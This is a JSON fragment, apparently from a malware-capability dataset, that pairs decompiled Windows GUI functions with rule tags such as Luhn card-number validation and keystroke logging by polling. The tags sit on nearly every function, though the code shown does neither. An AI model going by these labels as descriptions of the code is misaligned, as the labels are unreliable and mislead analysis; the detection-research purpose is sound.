        "decompiled_code": "\nvoid fcn.00434a7c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x434bfb;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    (**(*in_EAX + 0x44))();\n    if (*(in_EAX + 0x25a) != '\\0') {\n        fcn.00434a44(&stack0xfffffffc);\n        fcn.00433b38(in_EAX[0x97]);\n    }\n    fcn.00437d14();\n    cVar1 = fcn.00437e1c();\n    if ((cVar1 == '\\0') || ((*(in_EAX + 0x52) & 4) == 0)) {\n        fcn.00433b38(in_EAX[0x98]);\n    }\n    else {\n        sub.user32.dll_InflateRect(&var_18h, -in_EAX[0x98], -in_EAX[0x98]);\n    }\n    if (*(in_EAX + 0x259) != '\\0') {\n        fcn.00434a44(&stack0xfffffffc);\n        fcn.00433b38(in_EAX[0x97]);\n    }\n    fcn.00437d14();\n    cVar1 = fcn.00437e1c();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0044e5d0();\n        if (cVar1 != '\\0') goto code_r0x00434b80;\n    }\n    fcn.004214d4();\n    fcn.00421878();\ncode_r0x00434b80:\n    fcn.004215f0();\n    fcn.00421b80();\n    uVar2 = fcn.00447efc();\n    fcn.004455ac(0xffffffff, &var_18h, uVar2);\n    uVar2 = fcn.00405264();\n    uVar2 = fcn.00421c8c(uVar2);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar2;\n    fcn.00404da0(0x434c02);\n    return;\n}\n",
        "token_count": 570
    },
    "0043502c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0043502c(int32_t *param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.0042ea88();\n    fcn.00414d8c();\n    fcn.004454cc();\n    (**(*param_1 + 0x50))();\n    (**(*in_EAX + 0x68))();\n    fcn.00445720();\n    in_EAX[0x45] = param_1;\n    in_EAX[0x44] = 0x435460;\n    (**(*in_EAX + 0x6c))();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 256
    },
    "004363c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004363c0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    sub.user32.dll_GetWindowRect();\n    if (*(**0x492b60 + 0x44) == 0) {\n        fcn.0045fc3c();\n    }\n    else if (*(**0x492ce0 + 0x6c) == 0) {\n        fcn.0045b858();\n    }\n    else {\n        fcn.0045b858();\n    }\n    iVar1 = fcn.0045f91c(0, 0, 0x15);\n    iVar2 = fcn.0045f900();\n    fcn.0045f8e8(iVar1 + (auStack28 + (iVar2 - iStack24)) / 3);\n    fcn.0045f934();\n    sub.user32.dll_SetWindowPos();\n    return;\n}\n",
        "token_count": 219
    },
    "004366e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004366e0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041b50c();\n    *(in_EAX + 0x30) = 1;\n    pcVar2 = fcn.00436814;\n    uVar1 = fcn.0041c5e0(fcn.00436814, in_EAX);\n    *(in_EAX + 0x44) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = pcVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 211
    },
    "004368ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004368ac(uint param_1, code *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = 0x4368c7;\n    fcn.00463b50();\n    puStack40 = 0x4368d1;\n    fcn.00458004();\n    puStack40 = 0x4368d9;\n    fcn.00457f20();\n    uStack44 = 0x436955;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x43691c;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *0x4913ac = in_EAX;\n    puStack40 = &stack0xfffffffc;\n    (*param_2)();\n    *in_FS_OFFSET = param_1;\n    return;\n}\n",
        "token_count": 295
    },
    "00436a14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00436a14(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004366e0();\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 0x60) = uVar1;\n    *(in_EAX + 100) = *0x436a90;\n    *(in_EAX + 0xb8) = *0x436a94;\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 0x84) = uVar1;\n    *(in_EAX + 0x6c) = 1;\n    *(in_EAX + 0x88) = 0;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 266
    },
    "004377a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004377a0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00455730();\n    *(in_EAX + 0x60) = 0;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "00437e8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437e8c(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00437ddc();\n    (***0x4929ec)(uVar1);\n    return;\n}\n",
        "token_count": 86
    },
    "00437edc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437edc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00437ddc();\n    (***0x492ad8)(uVar1);\n    return;\n}\n",
        "token_count": 90
    },
    "00437f28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437f28(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00437ddc();\n    (***0x492a94)(uVar1);\n    return;\n}\n",
        "token_count": 78
    },
    "00437f6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437f6c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00437ddc();\n    (***0x492c5c)(uVar1);\n    return;\n}\n",
        "token_count": 86
    },
    "0043801c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043801c(uint arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = *arg_10h;\n    uStack28 = arg_10h[1];\n    uStack24 = arg_10h[2];\n    uStack20 = arg_10h[3];\n    var_ch = *in_ECX;\n    var_8h = in_ECX[1];\n    var_4h = in_ECX[2];\n    uVar1 = fcn.004056f0(arg_ch, arg_8h, &var_1ch);\n    fcn.004056e0(uVar1);\n    uVar1 = fcn.00437ddc();\n    (***0x492c1c)(uVar1);\n    return;\n}\n",
        "token_count": 243
    },
    "0043876c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043876c(char param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint var_34h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    int32_t var_18h;\n    int32_t iStack24;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hdc;\n    uint var_4h;\n    \n    uStack88 = 0xffffffec;\n    uStack92 = 0x438786;\n    var_4h = param_2;\n    uStack92 = fcn.0044d1c8();\n    puStack96 = 0x43878c;\n    uVar1 = sub.user32.dll_GetWindowLongA();\n    if ((uVar1 & 0x200) != 0) {\n        puStack96 = &fcn.0043876c::nLeftRect;\n        uStack100 = 0x4387a1;\n        uStack100 = fcn.0044d1c8();\n        iStack104 = 0x4387a7;\n        sub.user32.dll_GetWindowRect();\n        iStack104 = -nTopRect;\n        iStack108 = -nLeftRect;\n        puStack112 = &fcn.0043876c::nLeftRect;\n        uStack116 = 0x4387bc;\n        sub.user32.dll_OffsetRect();\n        uStack116 = 0x4387c4;\n        uStack116 = fcn.0044d1c8();\n        puStack120 = 0x4387ca;\n        hdc = sub.user32.dll_GetWindowDC();\n        uStack124 = 0x4388c7;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        var_18h = nLeftRect;\n        iStack24 = nTopRect;\n        var_10h = nRightRect;\n        var_ch = nBottomRect;\n        puStack120 = &stack0xfffffffc;\n        if (param_1 != '\\0') {\n            puStack120 = &stack0xfffffffc;\n            uVar2 = fcn.0044d1c8(0xfffffff0);\n            uVar1 = sub.user32.dll_GetWindowLongA(uVar2);\n            if (((uVar1 & 0x100000) != 0) && ((uVar1 & 0x200000) != 0)) {\n                sub.user32.dll_GetSystemMetrics(2);\n                sub.user32.dll_GetSystemMetrics(3);\n                sub.user32.dll_InflateRect(&fcn.0043876c::var_18h, 0xfffffffe, 0xfffffffe);\n                fcn.00413a94(&fcn.0043876c::var_44h, var_ch);\n                var_18h = var_44h;\n                iStack24 = iStack68;\n                var_10h = iStack64;\n                var_ch = iStack60;\n                uVar2 = sub.user32.dll_GetSysColorBrush(0xf);\n                sub.user32.dll_FillRect(hdc, &fcn.0043876c::var_18h, uVar2);\n            }\n        }\n        sub.gdi32.dll_ExcludeClipRect(hdc, nLeftRect + 2, nTopRect + 2, nRightRect + -2, nBottomRect + -2);\n        fcn.00438108();\n        uVar2 = 0;\n        fcn.00437f28(0, &fcn.0043876c::nLeftRect);\n        *in_FS_OFFSET = uVar2;\n        uVar2 = fcn.0044d1c8(hdc, 0x4388ce);\n        sub.user32.dll_ReleaseDC(uVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 967
    },
    "0043a608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043a608(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x70) != 0) && (cVar1 = fcn.004040e4(),  cVar1 != '\\0')) {\n        fcn.0043cfb0();\n        fcn.0043d498();\n    }\n    if (*(in_EAX + 0x70) != 0) {\n        fcn.0043e204();\n    }\n    fcn.00439dac();\n    return;\n}\n",
        "token_count": 135
    },
    "0043bfc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bfc8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_154h;\n    uint var_bch;\n    uint var_b8h;\n    \n    var_154h = 0x154;\n    iVar1 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_154h, 0);\n    if (iVar1 != 0) {\n        **(arg_8h + -4) = var_bch;\n        **(arg_8h + 8) = var_b8h;\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0043cdac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043cdac(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    (**(**(arg_8h + -8) + 8))();\n    uVar1 = (**(**(arg_8h + -0xc) + 0x14))();\n    *(arg_8h + -0x10) = uVar1;\n    iVar2 = (**(**(arg_8h + -0x14) + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar1 = (**(**(arg_8h + -0x14) + 0x18))();\n            (**(**(arg_8h + -0x14) + 0x18))(uVar1);\n            (**(**(arg_8h + -8) + 0x3c))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00404e38();\n    return;\n}\n",
        "token_count": 235
    },
    "0043d848": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0043d848(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00439dac();\n    return 0;\n}\n",
        "token_count": 62
    },
    "0043dbc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nuint32_t fcn.0043dbc0(void)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = *in_EAX;\n    uVar1 = in_EAX[1];\n    uVar3 = uVar1 & 0xff;\n    if (uVar1 != 0) {\n        iVar2 = sub.user32.dll_GetKeyState(0x10, uVar4, uVar1, in_EAX[2], in_EAX[3]);\n        if (iVar2 < 0) {\n            uVar3 = uVar1 + 0x2000;\n        }\n        iVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (iVar2 < 0) {\n            uVar3 = uVar3 + 0x4000;\n        }\n        if ((uVar4 & 0x20000000) != 0) {\n            uVar3 = uVar3 + 0x8000;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 251
    },
    "0043ed60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0043ed60(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0043d650();\n    in_EAX[0x16] = -1;\n    in_EAX[0x17] = -1;\n    iVar1 = in_EAX[0xd];\n    *(iVar1 + 0x8c) = in_EAX;\n    *(iVar1 + 0x88) = *(*in_EAX + 0x3c);\n    in_EAX[0xe] = *(**0x492b60 + 0x30);\n    *(in_EAX + 0x61) = 1;\n    fcn.0043ed1c();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 266
    },
    "004422cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004422cc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar auStack16 [8];\n    \n    puVar3 = auStack16;\n    iVar1 = param_2;\n    sub.gdi32.dll_GetWindowOrgEx(param_2, auStack16);\n    iVar2 = param_2;\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1 + *(in_EAX + 0x40), puVar3 + *(in_EAX + 0x44), 0);\n    iVar1 = param_2;\n    fcn.00446870(param_2);\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1, iVar2, 0);\n    return;\n}\n",
        "token_count": 194
    },
    "00442458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442458(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = fcn.00402ce4();\n    *puVar2 = param_2;\n    uVar3 = fcn.0044242c(&stack0xfffffffc);\n    puVar2[1] = uVar3;\n    cVar1 = fcn.004423f4();\n    if (cVar1 == '\\0') {\n        fcn.00414d8c();\n    }\n    else {\n        fcn.00414eec();\n        uVar3 = fcn.0044d1c8();\n        uVar3 = fcn.0044d1c8(uVar3);\n        sub.user32.dll_IsChild(uVar3);\n        fcn.00414f68();\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "004427d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004427d8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x40) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00443aec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00443aec(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    uint arg_ch;\n    \n    arg_ch = 0x443b00;\n    iVar1 = fcn.00443ab8();\n    iVar3 = 0;\n    if (iVar1 != 0) {\n        arg_ch = 0;\n        arg_8h = 0;\n        fcn.004450dc();\n        iVar2 = fcn.0044a300(arg_8h, arg_ch);\n        iVar3 = iVar1;\n        if (iVar2 != 0) {\n            iVar3 = iVar2;\n        }\n    }\n    return CONCAT44(arg_ch, iVar3);\n}\n",
        "token_count": 167
    },
    "00443b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00443b80(void)\n\n{\n    sub.gdi32.dll_GetWindowOrgEx();\n    sub.gdi32.dll_SetWindowOrgEx();\n    return;\n}\n",
        "token_count": 38
    },
    "00443bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00443bb0(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack24 = 0x443bc0;\n    var_8h = fcn.004152b4();\n    uStack28 = 0x443c60;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (-1 < *(var_8h + 8) + -1) {\n        var_4h = 0;\n        puStack24 = &stack0xfffffffc;\n        var_ch = *(var_8h + 8);\n        do {\n            puStack36 = 0x443bf2;\n            var_10h = fcn.00414eec();\n            puStack36 = 0x443bfd;\n            cVar1 = fcn.00421afc();\n            if (cVar1 != '\\0') {\n                uStack40 = 0x443c39;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.00443dec();\n                fcn.00404878();\n                fcn.00404878();\n                return;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x443c67;\n    uStack28 = 0x443c5f;\n    fcn.00415318();\n    return;\n}\n",
        "token_count": 429
    },
    "00443e64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00443e64(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "004444d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004444d4(void)\n\n{\n    int32_t *arg_8h;\n    char extraout_DL;\n    \n    arg_8h = fcn.00404324();\n    fcn.00461158();\n    if ((arg_8h[0x25] == 0) || ((*(arg_8h[0x25] + 0x1c) & 8) != 0)) {\n        (**(*arg_8h + 0x6c))();\n    }\n    else {\n        fcn.0041b820();\n        fcn.00446870(arg_8h);\n        (**(*arg_8h + 0x6c))();\n        fcn.00444ebc();\n        fcn.00404154();\n        arg_8h[0x25] = 0;\n    }\n    fcn.00403f58();\n    arg_8h[0x1b] = 0;\n    fcn.00403f58();\n    fcn.00403f58();\n    fcn.004097f0();\n    fcn.00403f58();\n    fcn.0041b558();\n    if ('\\0' < extraout_DL) {\n        fcn.004042cc();\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "00444ebc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444ebc(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *(in_EAX + 0x40);\n    param_2[1] = *(in_EAX + 0x44);\n    param_2[2] = *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    param_2[3] = *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    return;\n}\n",
        "token_count": 129
    },
    "00444f18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00444f18(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack12;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack12;\n}\n",
        "token_count": 48
    },
    "00444f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00444f30(void)\n\n{\n    fcn.00444f5c();\n    fcn.00413a6c();\n    fcn.00445438();\n    return;\n}\n",
        "token_count": 44
    },
    "00444f5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00444f5c(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack8;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack8;\n}\n",
        "token_count": 49
    },
    "00444f74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00444f74(void)\n\n{\n    fcn.00444f18();\n    fcn.00413a6c();\n    fcn.00445438();\n    return;\n}\n",
        "token_count": 43
    },
    "0044502c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044502c(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 + iStack20;\n    param_1[1] = param_2[1] + iStack16;\n    return;\n}\n",
        "token_count": 105
    },
    "004450dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004450dc(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 - iStack20;\n    param_1[1] = param_2[1] - iStack16;\n    return;\n}\n",
        "token_count": 104
    },
    "00445438": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445438(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iVar1 = *param_2;\n    iVar2 = param_2[1];\n    (**(*in_EAX + 0x44))(iVar1, iVar2);\n    (**(*in_EAX + 0x88))((in_EAX[0x13] - iStack16) + iVar2, (in_EAX[0x12] - iStack20) + iVar1);\n    return;\n}\n",
        "token_count": 153
    },
    "00446598": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00446598(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar auStack28 [16];\n    \n    uVar3 = *param_2;\n    uVar4 = param_2[1];\n    uVar5 = param_2[2];\n    uVar6 = param_2[3];\n    if (*(in_EAX + 0x94) != 0) {\n        cVar1 = fcn.00404154(uVar3, uVar4, uVar5, uVar6);\n        if (cVar1 == '\\0') {\n            cVar1 = '\\0';\n            goto code_r0x004465cc;\n        }\n    }\n    cVar1 = '\\x01';\ncode_r0x004465cc:\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.0044797c();\n        if (iVar2 == 0) {\n            fcn.00404154(uVar3, uVar4, uVar5, uVar6);\n        }\n        else {\n            uVar3 = fcn.00444f5c();\n            arg_8h = auStack28;\n            fcn.00444f18();\n            fcn.00413a94(arg_8h, uVar3);\n            fcn.00404154();\n        }\n    }\n    return cVar1;\n}\n",
        "token_count": 351
    },
    "0044673c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044673c(uint param_1, int32_t param_2)\n\n{\n    uint uStack16;\n    \n    sub.user32.dll_GetCursorPos();\n    fcn.004450dc();\n    *param_2 = param_2;\n    *(param_2 + 4) = uStack16;\n    return;\n}\n",
        "token_count": 76
    },
    "00446870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446870(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        (**(in_EAX + 0x38))();\n    }\n    return 0;\n}\n",
        "token_count": 84
    },
    "00446f18": {
        "rules": [
